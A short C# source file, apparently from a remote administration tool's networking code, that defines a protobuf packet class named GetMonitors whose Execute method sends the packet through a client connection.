using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class GetMonitors : IPacket
    {
        public GetMonitors()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}